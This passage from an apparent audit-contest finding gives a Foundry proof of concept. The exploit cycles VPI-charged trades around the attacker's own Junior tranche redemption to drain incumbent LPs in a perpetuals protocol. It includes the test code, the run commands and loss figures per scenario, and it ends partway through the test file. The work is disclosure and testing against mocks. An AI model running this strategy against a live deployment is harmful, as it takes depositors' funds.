The PoC prints two attacker figures. "Vs not taking part" is the one used above. "Vs honest" compares the attack run with the honest run, in which the attacker makes the same deposits and redemptions without trading; it is larger by the attacker's share of the Senior coupon (148,068 rather than 115,037 in test 2). On that basis the incumbent's loss equals the attacker's gain plus the opening execution fees paid to the treasury (1,050,895 ≈ 148,068 + 902,932), with a residual under 0.01 %. The PoC also logs the Senior LP and the settling keeper; both are within 1 USDG of the honest run.


## Proof of Concept

## Proof of Concept

One Foundry test file in the repository's own test suite at commit `a82d4fef`. It inherits only `BasePerpTest` and changes no in-scope contract. After `setUp`, every state change goes through public entrypoints: vault requests and claims, `OrderRouter.commitOrder`, `executeOrder` and `settleLpEpoch`, plus mock Pyth updates and `vm.warp`. Only out-of-scope components are mocked, as the program allows: Pyth updates and the USDG token. Every Pyth update carries a confidence of 3 bp of price unless a test says otherwise, so every open and close executes at the side-adverse price. Funding is minted only to EOAs, and `vm.prank` is used only for EOAs. All parameters are the release parameters in `packages/perps/DEPLOYMENT.md:123-155`.

### Setup and run

```bash
# in a clone of audit-comp-plether at a82d4fef, with the repository's dependencies installed
# save the file below as packages/perps/test/poc/VpiRedemptionDrain.t.sol
cd packages/perps
forge test --match-path test/poc/VpiRedemptionDrain.t.sol -vv
```

This uses the repository's own `packages/perps/foundry.toml` (solc 0.8.35, via_ir, optimizer 200). The first build takes a few minutes; the tests then run in about 25 seconds. The long loops run with `vm.pauseGasMetering()` so that they fit the test gas limit; gas is not measured.

### Expected output

```
[PASS] test_01_W1x_30Cycles()
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9731317004133
  victim loss (USDG atoms) / bps of its 10M holding
  252242087480
  252
  attacker net gain after all fees vs honest (USDG atoms)
  24811097915
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  16585332874
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  540268825836
  454946016000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227455947511
  228476
  0
  -25186422
[PASS] test_02_W1x_120Cycles()
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 300
  cycles / elapsed days 120 21
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9889419079692 8838524171166
  victim loss (USDG atoms) / bps of its 10M holding
  1050894908526
  1050
  attacker net gain after all fees vs honest (USDG atoms)
  148067882199
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  115036927955
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  2144704817971
  1805998908000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  902931728985
  229431
  0
  -104932089
[PASS] test_03_W5x_UntilCovenantFloor()
  W (USDG atoms) / confidence (1/100 bp) 50000000000000 300
  cycles / elapsed days 65 10
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9961157274590 7483288379910
  victim loss (USDG atoms) / bps of its 10M holding
  2477868894680
  2477
  attacker net gain after all fees vs honest (USDG atoms)
  1600799827304
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  1571077071391
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  2083863901940
  1754764116000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  877316254317
  228826
  0
  -247415767
  settlement made progress at the floor 0
  victim asks to redeem 10 % of its shares at the floor: claimable / still pending 0 1001499962516360
  junior principal / senior principal 7531454903826 30069570933769
[PASS] test_04_SeniorEqualsJunior()
[PASS] test_05_CapitalThreshold()
[PASS] test_06_NaturalSkewSweep()
[PASS] test_07_ConfidenceSweep()
  (tests 4-7 print one block per run in the format above; their output follows "What each test does")
[PASS] test_08_PassiveExitDuringOpenSkew()
  passive LP (5 M Junior) proceeds: exit while open / exit after close 5011073107787 5002957074377
  remaining Junior LP (10 M) value: when the other exits while open / after close 9997541091519 10005640023189
[PASS] test_09_PassiveEntryDuringOpenSkew()
  depositor (5 M Junior) value after the close: entered while open / entered after close 4993874997877 4999999999999
Suite result: ok. 9 passed; 0 failed; 0 skipped
```

All amounts are USDG atoms (6 decimals). "Victim" is the address that holds the whole incumbent Junior tranche (10 M USDG); a 30 M Senior LP sits beside it.

### What each test does

Each scenario runs twice from one snapshot: an attack run and an honest run that makes the same deposits and redemptions without the trade. Each block prints the victim's value at the start, at the end of the honest run and at the end of the attack run; the victim's loss is the difference between the last two. "Vs not taking part" is the attacker's own result, which also pays its share of the Senior coupon; "vs honest" is larger by that coupon share. The attacker's money is its LP wallet, its trader account, and the keeper it uses to execute its own orders. Each block also logs where the victim's loss went (treasury, Senior LP, settling keeper, rounding residual) and what the attacker's trade legs cost against two execution fees per cycle.

One cycle: the attacker deposits W into Junior, waits the 1 h cooldown, requests redemption of all its shares, opens a LONG that brings aggregate skew to 0.38 of depth 60 s before its redemption epoch, lets an unrelated keeper settle the epoch, claims, and closes the LONG at the same price. Cycles run back to back on weekdays outside the FAD window. Before keeping a cycle, the test checks that the attacker came out ahead of not taking part and that its redemption was fully funded; otherwise it reverts that cycle and ends the run. A real attacker gets the same answer by simulating the cycle off-chain before committing.

- **Test 1.** W = 1 × incumbent Junior, 30 cycles. Asserts that all 30 cycles run, the victim loses more than 1 % of its Junior, the attacker profits, and the mark price is still 1.05 at the end.
- **Test 2.** W = 1 ×, 120 cycles over 21 days. Asserts that the victim loses more than 10 % and the attacker profits.
- **Test 3.** W = 5 ×, run until the attacker's own exit is no longer funded. Asserts that the victim loses more than 20 % and the attacker profits. It then replays the attack to that point and shows the Junior covenant floor: a request to redeem 10 % of the victim's shares makes no settlement progress and stays fully pending. This is documented covenant behaviour; the test shows only where the drain ends.
- **Test 4.** The Senior LP first redeems two thirds of its shares through the vault, leaving 10 M Senior against 10 M Junior. Runs W = 1 ×, 2 × and 3 × for up to 120 cycles each. The W = 3 × run stops after 88 cycles because its 30 M redemption is no longer fully funded from the pool's free cash.
- **Test 5.** No other traders. Runs W = 0.5 ×, 0.75 ×, 1 × and 2 × for 30 cycles each. Asserts that W = 0.5 × is not profitable (0 cycles) and that W = 1 × and 2 × run every cycle.
- **Test 6.** An unrelated trader first opens a LONG of K = 20, 30 or 35 % of depth, present in both runs. The attacker tops skew up to 0.38 of depth with W = 0.25 ×, 0.33 ×, 0.4 × or 0.5 ×, 30 cycles each.
- **Test 7.** W = 1 × at 0, 1, 2, 3, 3.5 and 4 bp basket confidence, then W = 2 × and 5 × at 9 bp, 30 cycles each. At 0 bp it asserts that the attacker's trade legs cost the two execution fees per cycle plus less than 0.1 % of those fees, which shows the VPI charge comes back in full and no rebate beyond it is paid.
- **Test 8.** No attacker. An unrelated trader holds a LONG of 38 % of depth. An ordinary 5 M Junior LP redeems either while the position is open or after the trader closes at the same price. Asserts that exiting while it is open pays more, and that the 10 M LP who stays ends worse off.
- **Test 9.** No attacker. Same position. An ordinary 5 M deposit activates either while the position is open or after it closes. Asserts that entering while it is open leaves the depositor with less after the close.

### Output of tests 4-7

The tables in §6 of the description are taken from these blocks. Runs that were not profitable (0 cycles) are shown as one line.

```
[PASS] test_04_SeniorEqualsJunior()
  senior principal / junior principal 10001184173556 10000450529641
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 300
  cycles / elapsed days 120 21
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999452082066 9962479224691 9348723974162
  victim loss (USDG atoms) / bps of its 10M holding
  613755250529
  613
  attacker net gain after all fees vs honest (USDG atoms)
  72033154494
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  61039605244
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  1286880937600
  1083647880000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  541783303149
  76480
  0
  -61283594
  W (USDG atoms) / confidence (1/100 bp) 20000000000000 300
  cycles / elapsed days 120 21
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999452082066 9966138490236 8534974984254
  victim loss (USDG atoms) / bps of its 10M holding
  1431163505982
  1431
  attacker net gain after all fees vs honest (USDG atoms)
  714440848496
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  699787668323
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  1702749290631
  1433838504000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  716865483001
  76480
  0
  -142901995
  W (USDG atoms) / confidence (1/100 bp) 30000000000000 300
  cycles / elapsed days 88 15
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999452082066 9977317558272 8396113029929
  victim loss (USDG atoms) / bps of its 10M holding
  1581204528343
  1581
  attacker net gain after all fees vs honest (USDG atoms)
  922910985197
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  910832829014
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  1564000962303
  1317001476000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  658451350403
  76369
  0
  -157883626
[PASS] test_05_CapitalThreshold()
  W (USDG atoms) / confidence (1/100 bp) 5000000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  W (USDG atoms) / confidence (1/100 bp) 7500000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9731317004133
  victim loss (USDG atoms) / bps of its 10M holding
  252242087480
  252
  attacker net gain after all fees vs honest (USDG atoms)
  24811097915
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  16585332874
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  540268825836
  454946016000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227455947511
  228476
  0
  -25186422
  W (USDG atoms) / confidence (1/100 bp) 20000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9986298934303 9456506760658
  victim loss (USDG atoms) / bps of its 10M holding
  529792173645
  529
  attacker net gain after all fees vs honest (USDG atoms)
  257395824254
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  246429942949
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  647139635873
  544938912000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  272449020777
  228476
  0
  -52899862
[PASS] test_06_NaturalSkewSweep()
  third-party skew (% of depth) 20
  W (USDG atoms) / confidence (1/100 bp) 2500000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 20
  W (USDG atoms) / confidence (1/100 bp) 3333333333333 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 20
  W (USDG atoms) / confidence (1/100 bp) 4000000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 20
  W (USDG atoms) / confidence (1/100 bp) 5000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  10010797642245 9991612369543 9883689381514
  victim loss (USDG atoms) / bps of its 10M holding
  107922988029
  107
  attacker net gain after all fees vs honest (USDG atoms)
  10916016706
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  5434975196
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  230442345951
  194049744000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  97017595121
  152331
  0
  -10776129
  third-party skew (% of depth) 30
  W (USDG atoms) / confidence (1/100 bp) 2500000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 30
  W (USDG atoms) / confidence (1/100 bp) 3333333333333 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 30
  W (USDG atoms) / confidence (1/100 bp) 4000000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 30
  W (USDG atoms) / confidence (1/100 bp) 5000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  10023788675340 10004598661331 9938838437684
  victim loss (USDG atoms) / bps of its 10M holding
  65760223647
  65
  attacker net gain after all fees vs honest (USDG atoms)
  22597277440
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  17120977710
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  102538512852
  86345196000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  43169360043
  152331
  0
  -6566167
  third-party skew (% of depth) 35
  W (USDG atoms) / confidence (1/100 bp) 2500000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 35
  W (USDG atoms) / confidence (1/100 bp) 3333333333333 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 35
  W (USDG atoms) / confidence (1/100 bp) 4000000000000 300: 0 cycles (not profitable), so every difference in the block is zero
  third-party skew (% of depth) 35
  W (USDG atoms) / confidence (1/100 bp) 5000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  10032182014110 10012988941167 9984878938998
  victim loss (USDG atoms) / bps of its 10M holding
  28110002169
  28
  attacker net gain after all fees vs honest (USDG atoms)
  11821490566
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  6348250076
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  38695760533
  32584776000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  16291166056
  152331
  0
  -2806784
[PASS] test_07_ConfidenceSweep()
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 0
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9666740455806
  victim loss (USDG atoms) / bps of its 10M holding
  316818635807
  316
  attacker net gain after all fees vs honest (USDG atoms)
  89518993736
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  81293228695
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  454682516851
  454662096000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227331048000
  228476
  0
  -31634405
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 100
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9688250096454
  victim loss (USDG atoms) / bps of its 10M holding
  295308995159
  295
  attacker net gain after all fees vs honest (USDG atoms)
  67965681816
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  59739916775
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  483199218486
  454756512000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227372571530
  228476
  0
  -29486663
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 200
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9709775550659
  victim loss (USDG atoms) / bps of its 10M holding
  273783540954
  273
  attacker net gain after all fees vs honest (USDG atoms)
  46396431112
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  38170666071
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  511728005656
  454851180000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227414218707
  228476
  0
  -27337341
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 300
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9731317004133
  victim loss (USDG atoms) / bps of its 10M holding
  252242087480
  252
  attacker net gain after all fees vs honest (USDG atoms)
  24811097915
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  16585332874
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  540268825836
  454946016000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227455947511
  228476
  0
  -25186422
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 350
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9983559091613 9742089781870
  victim loss (USDG atoms) / bps of its 10M holding
  241469309743
  241
  attacker net gain after all fees vs honest (USDG atoms)
  14016400919
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  5790635878
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  554538213587
  454993392000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  227476791106
  228476
  0
  -24110758
  W (USDG atoms) / confidence (1/100 bp) 10000000000000 400: 0 cycles (not profitable), so every difference in the block is zero
  W (USDG atoms) / confidence (1/100 bp) 20000000000000 900
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9986298934303 9594146022645
  victim loss (USDG atoms) / bps of its 10M holding
  392152911658
  392
  attacker net gain after all fees vs honest (USDG atoms)
  119480895516
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  108515014211
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  852438188274
  545544636000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  272710944216
  228476
  0
  -39156550
  W (USDG atoms) / confidence (1/100 bp) 50000000000000 900
  cycles / elapsed days 30 3
  victim value: start / end of honest run / end of attack run (USDG atoms)
  9999999990854 9989038480546 9035969058091
  victim loss (USDG atoms) / bps of its 10M holding
  953069422455
  953
  attacker net gain after all fees vs honest (USDG atoms)
  544911025859
  attacker net gain vs not taking part at all (USDG atoms; includes its share of the Senior coupon)
  531205324767
  attacker trade legs over the attack run: cost / two execution fees per cycle (USDG atoms)
  1276116674060
  816690420000
  value flow vs honest: protocol treasury / Senior LP / settling keeper / unattributed
  408253332311
  228476
  0
  -95164191
```

### test/poc/VpiRedemptionDrain.t.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console} from "forge-std/console.sol";

/// @title PoC: repeated VPI round trips around the attacker's own Junior redemption take the incumbent Junior LPs'
///        principal.
/// @notice Root cause: an open's VPI charge is credited to HousePool cash (CfdEngineSettlementSidecar.sol:446-463)
///         and therefore to Junior share pricing (HousePoolAccountingLib.sol:60-78; HousePool.sol:835-889), although
///         the same position gets it back as a close rebate (lifetime clamp, SECURITY.md:1443). The attacker deposits
///         a temporary Junior stake, opens a skew-increasing LONG 60 s before its own redemption epoch, lets an
///         unrelated keeper settle the epoch (redemption funded at the inflated price), then closes at the same price
///         and gets the charge back. Its own deposit raises economic depth, so the skew cap (0.4 x depth) and the
///         charge grow with it while the victims do not.
///         Only public entrypoints after setUp; basket price constant 1.05; weekday, non-FAD timing.
///         Parameters: DeployPerpsArbitrumSepolia.s.sol:434-446 (risk), :78-79 (senior caps 40 M / 8000 bp),
///         :98 (adverseConfidenceMultiplierBps 2500), :459 (basketMaxConfidenceRatioBps 10);
///         executionFeeBps 4 = CfdEngine.sol:147 default (the deploy script does not override it).
///         All values match the release parameters in packages/perps/DEPLOYMENT.md:123-155.
///         Oracle confidence: every Pyth update carries a confidence of CONF_CBP / 100 bp of price, so every open and
///         close pays the live side-adverse execution shift (PletherOracle.sol:905-941). Default 3 bp, about three
///         times the median basket confidence observed over 30 weekdays of Pyth history (about 1 bp).
contract VpiRedemptionDrainPoC is BasePerpTest {

    address internal constant KEEPER = address(0xB0B); // attacker-run keeper (permissionless order execution)
    address internal constant K2 = address(0xB0C); // unrelated keeper that settles LP epochs
    address internal constant VICTIM = address(0x7A01); // incumbent Junior LP (holds the whole incumbent Junior)
    address internal constant SENIOR_LP = address(0x7A02); // incumbent Senior LP
    address internal constant CROWD = address(0x7A03); // unrelated trader (natural-skew and passive-exit tests)
    address internal constant LP2 = address(0x7A04); // ordinary Junior LP (passive-exit test)
    address internal constant LP3 = address(0x7A05); // ordinary Junior depositor (passive-entry test)
    address internal constant A = address(0xE1); // attacker LP controller
    address internal constant AT = address(0xE2); // attacker trader account
    uint256 internal constant LOT = 1e20; // CfdTypes.SIZE_QUANTUM
    uint256 internal constant PRICE = 105_000_000; // basket 1.05
    uint256 internal constant LOT_NOTIONAL = 105e6; // 100 units x 1.05 USDG
    uint256 internal constant JUNIOR = 10_000_000e6; // incumbent Junior
    uint256 internal constant SENIOR = 30_000_000e6; // Senior / Junior = 3 (cap: 40 M absolute, 80 % share)
    uint256 internal constant MARGIN_BPS = 100; // attacker posts 1 % margin (init 20 bp + reserve/fee/VPI, OpenAccountingLib.sol:137)
    uint256 internal constant DEPLOY_ADVERSE_CONFIDENCE_BPS = 2500; // DeployPerpsArbitrumSepolia.s.sol:98
    uint256 internal constant CONF_CBP = 300; // default basket confidence, 1/100 bp of price (3.00 bp)

    uint256 internal w; // attacker temporary Junior deposit
    uint256 internal confCbp = CONF_CBP;
    bool internal attack;
    uint256 internal legStart; // attacker trader account + keeper before the open
    int256 internal legCostSum; // attacker trade-leg cost summed over an attack run
    uint256 internal legFeeSum; // two execution fees per cycle at executionFeeBps, summed over an attack run

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DeployPerpsArbitrumSepolia.s.sol:434-446
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // governance background: deployment confidence multiplier and Senior caps
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = DEPLOY_ADVERSE_CONFIDENCE_BPS;
        _setRouterConfig(rc);
        _setSeniorCapacity(40_000_000e6, 8000); // DeployPerpsArbitrumSepolia.s.sol:78-79
        _skipWeekend();
        _join(juniorVault, VICTIM, JUNIOR);
        _join(seniorVault, SENIOR_LP, SENIOR);
        _depositTrader(AT, 20_000_000e6);
    }

    // ------------------------------------------------------------------ public-entrypoint helpers

    /// @dev Mock Pyth update at `price` with confidence `confCbp` / 100 bp on every basket component.
    function _setPyth(
        uint256 price,
        uint256 publishTime
    ) internal {
        uint64 conf = uint64(price * confCbp / 1_000_000);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(int256(price)), conf, int32(-8), publishTime, publishTime - 1
        );
    }

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory u) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        _setPyth(price, vm.getBlockTimestamp());
        u = new bytes[](1);
        u[0] = abi.encode(price);
    }

    /// @dev Same publish-time rule as BasePerpTest._mockPythUpdateData, with confidence.
    function _execData(
        uint256 price
    ) internal returns (bytes[] memory u) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        _setPyth(price, _mockHistoricalPublishTime());
        u = new bytes[](1);
        u[0] = abi.encode(price);
    }

    function _refresh(
        uint256 price
    ) internal {
        bytes[] memory u = _pyth(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(u);
    }

    /// @dev Unrelated keeper settles: Router path with a fresh basket while positions exist, cached path otherwise.
    function _settle() internal {
        if (engine.terminalNavSnapshot().hasOpenPositions) {
            bytes[] memory u = _pyth(PRICE);
            vm.prank(K2);
            router.settleLpEpoch(u);
        } else {
            vm.prank(K2);
            pool.settleLpEpoch(0, 0);
        }
    }

    function settleExt() external {
        require(msg.sender == address(this), "self");
        _settle();
    }

    function _warpTo(
        uint256 t
    ) internal {
        if (vm.getBlockTimestamp() < t) {
            vm.warp(t);
            vm.roll(vm.getBlockNumber() + 1);
        }
    }

    function _depositTrader(
        address trader,
        uint256 amount
    ) internal {
        settlementToken.mint(trader, amount); // EOA funding only
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(trader, amount);
        vm.stopPrank();
    }

    function _join(
        TrancheVault v,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(v), amount);
        uint256 id = v.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _warpTo(id * 1 hours);
        _settle();
        uint256 a = v.claimableDepositRequest(id, lp);
        vm.prank(lp);
        shares = v.claimDeposit(id, a, lp, lp);
    }

    function _trade(
        address trader,
        uint256 lots,
        uint256 margin,
        bool isClose
    ) internal {
        _refresh(PRICE);
        vm.prank(trader);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, lots * LOT, margin, 0, isClose);
        bytes[] memory u = _execData(PRICE);
        vm.prank(KEEPER);
        router.executeOrder(id, u);
    }

    /// @dev Keep every cycle inside Mon 00:00 - Fri 17:00 UTC (FAD starts Fri 21:30 UTC, MarketCalendarLib.sol:41-44).
    function _skipWeekend() internal {
        uint256 dow = ((vm.getBlockTimestamp() / 1 days) + 4) % 7;
        uint256 sod = vm.getBlockTimestamp() % 1 days;
        if (dow == 6 || dow == 0 || (dow == 5 && sod >= 17 hours)) {
            uint256 d = dow == 5 ? 3 : (dow == 6 ? 2 : 1);
            _warpTo((vm.getBlockTimestamp() / 1 days + d) * 1 days + 1 hours);
        }
        _refresh(PRICE);
    }

    function _depth() internal view returns (uint256) {
        return pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
    }

    function _victimValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
    }

    function _seniorValue() internal view returns (uint256) {
        return seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
    }

    function _wealth(
        address who
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(who) + clearinghouse.balanceAssets(who);
    }

    /// @dev Everything the attacker controls: LP wallet, trader account, and its keeper (order execution bounty).
    function _attackerWealth() internal view returns (uint256) {
        return _wealth(A) + _wealth(AT) + _wealth(KEEPER);
    }

    /// @notice One cycle: deposit w into Junior, 1 h cooldown, redeem everything. Attack path additionally opens a
    ///         LONG that tops aggregate skew up to 0.38 x economic depth 60 s before the redemption epoch and closes
    ///         it after settlement.
    /// @return net attacker USDG change over the cycle (LP proceeds - w + trader account + keeper)
    function cycle() external returns (int256 net) {
        require(msg.sender == address(this), "self");
        _skipWeekend();
        uint256 before = _attackerWealth();
        settlementToken.mint(A, w);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), w);
        uint256 id = juniorVault.requestDeposit(w, A, A);
        vm.stopPrank();
        _warpTo(id * 1 hours);
        _settle();
        uint256 a = juniorVault.claimableDepositRequest(id, A);
        vm.prank(A);
        uint256 sh = juniorVault.claimDeposit(id, a, A, A);
        _warpTo(vm.getBlockTimestamp() + 1 hours); // TrancheVault.DEPOSIT_COOLDOWN
        _refresh(PRICE);
        vm.prank(A);
        uint256 rid = juniorVault.requestRedeem(sh, A, A);
        _warpTo(rid * 1 hours - 60);
        _refresh(PRICE);
        uint256 lots;
        if (attack) {
            // top the aggregate skew up to just below the 0.4 x economic-depth cap (maxSkewRatio 0.4e18)
            uint256 target = _depth() * 38 / 100;
            (, uint256 longOi,,) = engine.sides(uint256(CfdTypes.Side.LONG));
            uint256 existing = longOi * PRICE / 1e20;
            lots = (target - existing) / LOT_NOTIONAL;
            legStart = _wealth(AT) + _wealth(KEEPER);
            _trade(AT, lots, lots * LOT_NOTIONAL * MARGIN_BPS / 10_000, false);
        }
        _warpTo(rid * 1 hours);
        _settle();
        uint256 s = juniorVault.claimableRedeemRequest(rid, A);
        vm.prank(A);
        juniorVault.claimRedeem(rid, s, A, A);
        if (attack) {
            _trade(AT, lots, 0, true);
            legCostSum += int256(legStart) - int256(_wealth(AT) + _wealth(KEEPER));
            legFeeSum += 2 * lots * LOT_NOTIONAL * engine.executionFeeBps() / 10_000;
        }
        // a rational attacker only continues while its whole stake exits in the cycle
        require(juniorVault.balanceOf(A) == 0 && juniorVault.pendingRedeemEscrowShares() == 0, "exit not full");
        net = int256(_attackerWealth()) - int256(before) - int256(w);
    }

    function _run(
        bool atk,
        uint256 maxCycles,
        bool stopWhenUnprofitable
    ) internal returns (uint256 n, int256 sum) {
        attack = atk;
        for (n = 0; n < maxCycles; ++n) {
            uint256 s = vm.snapshotState();
            try this.cycle() returns (int256 r) {
                if (stopWhenUnprofitable && r <= 0) {
                    vm.revertToState(s);
                    break;
                }
                sum += r;
            } catch {
                vm.revertToState(s);
                break;
            }
        }
    }

    struct Result {
        uint256 cycles;
        uint256 daysElapsed;
        uint256 victimStart;
        uint256 victimHonest;
        uint256 victimAttacked;
        int256 attackerGain;
        int256 attackerAbsolute;
        int256 treasuryGain;
        int256 seniorGain;
        int256 settlerGain;
        int256 legCost;
        uint256 legFees;
    }

    /// @dev Attack path, then honest path with the same number of cycles from the same snapshot. Every figure is
    ///      attack minus honest, so the Senior coupon and any ordinary deposit/redeem effect cancel.
    function _differential(
        uint256 deposit,
        uint256 maxCycles
    ) internal returns (Result memory r) {
        w = deposit;
        uint256 t0 = vm.getBlockTimestamp();
        r.victimStart = _victimValue();
        uint256 snap = vm.snapshotState();
        int256 aSum;
        legCostSum = 0;
        legFeeSum = 0;
        (r.cycles, aSum) = _run(true, maxCycles, true);
        r.legCost = legCostSum;
        r.legFees = legFeeSum;
        r.victimAttacked = _victimValue();
